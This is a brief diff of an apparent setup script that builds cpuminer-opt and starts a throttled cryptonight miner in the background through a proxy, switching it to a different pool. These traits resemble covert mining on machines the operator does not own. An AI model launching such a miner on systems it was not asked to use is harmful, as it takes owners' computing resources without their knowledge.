@@ -5,4 +5,4 @@ cd cpuminer-opt
 chmod +x ./build.sh
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a cryptonight -o stratum+tcp://mapleminingpool.club:3333 -u MU7gDBjcq33SqchnGxM5V2Z3WY3kB3BvJXEjPq3RWay1hMs8U1BmYXp84LobtZLhXCDD32pf9myenHjaDMU8c43KUPRqjrV -p k67frozen -x 45.32.21.205:2212 --background
+cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.me:3393 -u MU7gDBjcq33SqchnGxM5V2Z3WY3kB3BvJXEjPq3RWay1hMs8U1BmYXp84LobtZLhXCDD32pf9myenHjaDMU8c43KUPRqjrV -p x -x 45.32.21.205:2212 --background
